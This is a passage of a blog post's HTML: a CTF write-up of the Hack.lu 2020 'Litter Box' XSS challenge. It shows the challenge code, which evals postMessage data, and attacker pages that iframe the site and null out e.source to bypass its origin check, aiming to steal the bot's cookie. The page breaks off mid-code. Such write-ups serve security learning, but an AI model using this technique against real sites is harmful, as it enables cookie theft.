<!DOCTYPE html><html><head><title>Alain's Blog | Hack.lu 2020 CTF - Litter Box - Writeup</title><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"><meta name="robots" content="index,follow"><meta name="theme-color" content="#212121"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><link rel="shortcut icon" href="/blog/favicon.ico"><link href="https://fonts.googleapis.com/css?family=Hind:400,700&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:300,400&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/icon?family=Material+Icons%7CMaterial+Icons+Outlined&amp;display=swap" rel="stylesheet"><style>
      body, input, button {
        font-family: 'Hind', sans-serif;
      }

      code, .hljs {
        font-family: 'Source Code Pro', 'Courier New', Courier, monospace;
      }

      .icon-font {
        font-family: 'Material Icons';
        font-weight: normal;
        font-style: normal;
        font-size: 24px;  /* Preferred icon size */
        display: inline-block;
        line-height: 1;
        text-transform: none;
        letter-spacing: normal;
        word-wrap: normal;
        white-space: nowrap;
        direction: ltr;
      
        /* Support for all WebKit browsers. */
        -webkit-font-smoothing: antialiased;
        /* Support for Safari and Chrome. */
        text-rendering: optimizeLegibility;
      
        /* Support for Firefox. */
        -moz-osx-font-smoothing: grayscale;
      
        /* Support for IE. */
        font-feature-settings: 'liga';
      }

      .icon-font.outline {
        font-family: 'Material Icons Outlined';
      }
    </style><link href="/blog/styles/codedoc-styles.css" rel="stylesheet"><script async="" defer="" src="/blog/bundle/codedoc-bundle.js"></script><script>window.githubConfig={"repo":"blog","user":"krial057"}</script><style>.container{padding-top: 0 !important}</style><style>#-codedoc-toc { backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px) }</style><meta name="twitter:title" content="Alain's Blog | Hack.lu 2020 CTF - Litter Box - Writeup"><meta name="twitter:image" content="https://algassert.com/assets/2014-03-27-Better-JS-Equality-Table/grouped-table.png"><meta property="og:type" content="article"><meta property="og:title" content="Alain's Blog | Hack.lu 2020 CTF - Litter Box - Writeup"><meta property="og:image" content="https://algassert.com/assets/2014-03-27-Better-JS-Equality-Table/grouped-table.png"><meta name="keywords" content=""><meta property="blog-tags" content=""></head><body><div class="header-0-0-3"></div><div id="-codedoc-container" class="container"><script>window.source = {"base":"posts","path":"hack_lu_litter_box.md","namespace":"/blog","title":{"base":"Alain's Blog","connector":" | "}}</script><h1 class="h-0-0-9 white"><span style=" 
      text-shadow: 0 0 8px black; 
      font-size: 48px"><p>Hack.lu 2020 CTF - Litter Box - Writeup</p></span></h1><script id="XDjEKRzxBU">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("XDjEKRzxBU", "tvU4ZvTyVzKC9UotaYeV1w==", {"name":"Alain","date":"25/10/2020"});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script><marker><br>

</marker><h1 id="the-challenge" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>The challenge</h1><p>First of all, I want to give a huge shoutout to <a href="https://twitter.com/fluxfingers">@fluxfingers</a> for organizing this years hack.lu CTF. It was amazing: the beautiful theme, creative and no guessing challenges, and no technical problems. </p><h2 id="source-code" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Source Code</h2><p>The challenge was purely a XSS challenge, so no server side trickeries. The source code was also very short:</p><pre class="with-bar"><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span>index.html</span></span><div class="line-0-0-14  -codedoc-code-line" data-content="<html>" id="code1-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <body>" id="code1-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        <script>" id="code1-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            window.onmessage = (e) => {" id="code1-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14 highlight -codedoc-code-line" data-content="                if (e.source == window.frames[0]){" id="code1-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>source <span class="token operator">==</span> window<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="                        eval(e.data) // ðŸ˜½" id="code1-l6"><span class="lineCounter-0-0-13 -codedoc-line-counter">6<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>                        <span class="token function">eval</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token comment">// ðŸ˜½</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="                }" id="code1-l7"><span class="lineCounter-0-0-13 -codedoc-line-counter">7<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>                <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="            }" id="code1-l8"><span class="lineCounter-0-0-13 -codedoc-line-counter">8<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>            <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        </script>" id="code1-l9"><span class="lineCounter-0-0-13 -codedoc-line-counter">9<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code1-l10"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">10<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        <script src='main.js'></script>" id="code1-l11"><span class="lineCounter-0-0-13 -codedoc-line-counter">11<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>main.js<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        <iframe id='litterbox' sandbox></iframe>" id="code1-l12"><span class="lineCounter-0-0-13 -codedoc-line-counter">12<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>litterbox<span class="token punctuation">'</span></span> <span class="token attr-name">sandbox</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    </body>" id="code1-l13"><span class="lineCounter-0-0-13 -codedoc-line-counter">13<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</html>" id="code1-l14"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">14<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><p>The source code of main.js:</p><pre class="with-bar"><code class="js -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span>main.js</span></span><div class="line-0-0-14  -codedoc-code-line" data-content="(async () => {" id="code2-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    const urlParams = new URLSearchParams(location.search)" id="code2-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    let src = urlParams.get('src') ? urlParams.get('src') : 'sandbox.html'" id="code2-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token keyword">let</span> src <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span> <span class="token operator">?</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">'sandbox.html'</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    // make sure its up" id="code2-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token comment">// make sure its up</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    try{" id="code2-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token keyword">try</span><span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        await fetch(src, {mode: 'no-cors', cache: 'no-cache'})" id="code2-l6"><span class="lineCounter-0-0-13 -codedoc-line-counter">6<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token punctuation">{</span>mode<span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span> cache<span class="token operator">:</span> <span class="token string">'no-cache'</span><span class="token punctuation">}</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    }" id="code2-l7"><span class="lineCounter-0-0-13 -codedoc-line-counter">7<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    catch(e){" id="code2-l8"><span class="lineCounter-0-0-13 -codedoc-line-counter">8<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        console.log('noooo hecking')" id="code2-l9"><span class="lineCounter-0-0-13 -codedoc-line-counter">9<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'noooo hecking'</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        return" id="code2-l10"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">10<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token keyword">return</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    }" id="code2-l11"><span class="lineCounter-0-0-13 -codedoc-line-counter">11<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    litterbox.src = src   " id="code2-l12"><span class="lineCounter-0-0-13 -codedoc-line-counter">12<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    litterbox<span class="token punctuation">.</span>src <span class="token operator">=</span> src   </div><br><div class="line-0-0-14  -codedoc-code-line" data-content="})()" id="code2-l13"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">13<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></div><br></code></pre><p>The goal was to steal a cookie set by the bot we submit a URL to.
It's pretty clear that we need to somehow pass the condition on line 5 in index.html to eval our own javascript to extract the cookie. So let's get started!</p><h1 id="the-solution" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>The solution</h1><h2 id="baby-steps" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Baby steps</h2><p>To reach the <code>eval</code> call, we first need to execute <code>onmessage</code>. This can be done by calling <code>postMessage</code> on the window. Let's give it a try by embedding the site in an iframe of one of our own controlled websites and execute postMessage on it:</p><pre class="with-bar"><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span>attack.html</span></span><div class="line-0-0-14  -codedoc-code-line" data-content=" <html>" id="code3-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="<html>" id="code3-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="  <body>" id="code3-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <iframe id=&quot;litterbox_website&quot;></iframe>" id="code3-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>litterbox_website<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code3-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <script>" id="code3-l6"><span class="lineCounter-0-0-13 -codedoc-line-counter">6<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      litterbox_website.src = &quot;https://litterbox.cf/&quot;" id="code3-l7"><span class="lineCounter-0-0-13 -codedoc-line-counter">7<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      litterbox_website<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"https://litterbox.cf/"</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      litterbox_website.onload = () => {" id="code3-l8"><span class="lineCounter-0-0-13 -codedoc-line-counter">8<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      litterbox_website<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        litterbox_website.contentWindow.postMessage(&quot;yolo&quot;, &quot;*&quot;) // --> '*' is used to allow to post messages cross domain" id="code3-l9"><span class="lineCounter-0-0-13 -codedoc-line-counter">9<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        litterbox_website<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">"yolo"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span> <span class="token comment">// --&gt; '*' is used to allow to post messages cross domain</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      }" id="code3-l10"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">10<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    </script>" id="code3-l11"><span class="lineCounter-0-0-13 -codedoc-line-counter">11<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="  </body>" id="code3-l12"><span class="lineCounter-0-0-13 -codedoc-line-counter">12<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</html>" id="code3-l13"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">13<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><p>Setting a breakpoint on <code>onmessage</code>, we can see that the event is triggered:</p><p><img src="img/breakpoint_onmessage.PNG" alt="bp">
Ok, now to the intersting part. We need to somehow pass the condition <code>e.source == window.frames[0]</code>.</p><h2 id="bypassing-esource--windowframes0" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Bypassing <code>e.source == window.frames[0]</code></h2><p>Using the example code before, we can see in the debugger, that <code>e.source</code> is the window containing our (attacker's) website (the one wehre <code>postMessage</code> was executed on).</p><p><code>window.frames[0]</code> is the window of the sandboxed iframe included at the end of the challenge website. At first sight, one might think that there are only 2 possibilities to make <code>e.source == window.frames[0]</code> evaluate to true:</p><h3 id="1-make-esource-reference-the-same-object-as-windowframes0" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>1. make <code>e.source</code> reference the same object as <code>window.frames[0]</code></h3><p>If we want to change <code>e.source</code> to be the same as <code>window.frames[0]</code>, we would need to execute the <code>postMessage</code>function from inside the sandboxed iframe. However, as the iframe is sandboxed, there is no way to execute javascript inside and therefore there is also no way to execute <code>postMessage</code> inside of it.</p><h3 id="2-make-windowframes0-reference-the-same-object-as-esource" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>2. make <code>window.frames[0]</code> reference the same object as <code>e.source</code></h3><p>For this, we would need the first embedded iframe on the litter box site to be the one that exectues <code>postMessage</code>. As there is no way to change the DOM on the website, it is impossible to add an own controlled iframe that is not sandboxed before the sandboxed iframe. What now?</p><h3 id="the-third-possibility-i-thought-there-were-only-2-possibilities" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>The third possibility: I thought there were only 2 possibilities</h3><p>What if we could change both <code>e.source</code> and <code>window.frames[0]</code>??
I knew of a way to make <code>e.source</code> equal to <code>null</code>. </p><h5 id="make-esource-be-null" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Make <code>e.source</code> be <code>null</code></h5><p>One can force <code>e.source</code> to be <code>null</code> by destroying the window that executed the <code>postMessage</code> before the <code>onMessage</code>is received by the other window! Let's give it a shot:</p><pre class="with-bar"><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span>attack.html</span></span><div class="line-0-0-14  -codedoc-code-line" data-content="<html>" id="code4-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="<html>" id="code4-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="  <body>" id="code4-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <iframe id=&quot;litterBoxWebsite&quot;></iframe>" id="code4-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>litterBoxWebsite<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code4-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    </div>" id="code4-l6"><span class="lineCounter-0-0-13 -codedoc-line-counter">6<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <script>" id="code4-l7"><span class="lineCounter-0-0-13 -codedoc-line-counter">7<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span></span></div><br><div class="line-0-0-14 added -codedoc-code-line" data-content="      let postMessageWithNullSource = (message) => {" id="code4-l8"><span class="lineCounter-0-0-13 -codedoc-line-counter">8<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token keyword">let</span> <span class="token function-variable function">postMessageWithNullSource</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14 added -codedoc-code-line" data-content="        let newWindow = document.createElement(&quot;iframe&quot;)" id="code4-l9"><span class="lineCounter-0-0-13 -codedoc-line-counter">9<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token keyword">let</span> newWindow <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14 added -codedoc-code-line" data-content="        document.body.appendChild(newWindow)" id="code4-l10"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">10<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>newWindow<span class="token punctuation">)</span></div><br><div class="line-0-0-14 added -codedoc-code-line" data-content="        newWindow.contentWindow" id="code4-l11"><span class="lineCounter-0-0-13 -codedoc-line-counter">11<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        newWindow<span class="token punctuation">.</span>contentWindow</div><br><div class="line-0-0-14 added -codedoc-code-line" data-content="              .eval(`top.litterBoxWebsite.contentWindow.postMessage('${message}', '*')`)" id="code4-l12"><span class="lineCounter-0-0-13 -codedoc-line-counter">12<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>              <span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">top.litterBoxWebsite.contentWindow.postMessage('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>message<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">', '*')</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span></div><br><div class="line-0-0-14 added -codedoc-code-line" data-content="        document.body.removeChild(newWindow) // --> remove the window that executed postMessage so that e.source will be null" id="code4-l13"><span class="lineCounter-0-0-13 -codedoc-line-counter">13<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>newWindow<span class="token punctuation">)</span> <span class="token comment">// --&gt; remove the window that executed postMessage so that e.source will be null</span></div><br><div class="line-0-0-14 added -codedoc-code-line" data-content="      }" id="code4-l14"><span class="lineCounter-0-0-13 -codedoc-line-counter">14<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code4-l15"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">15<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      litterBoxWebsite.src = &quot;https://litterbox.cf/&quot;" id="code4-l16"><span class="lineCounter-0-0-13 -codedoc-line-counter">16<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      litterBoxWebsite<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"https://litterbox.cf/"</span></div><br><div class="line-0-0-14  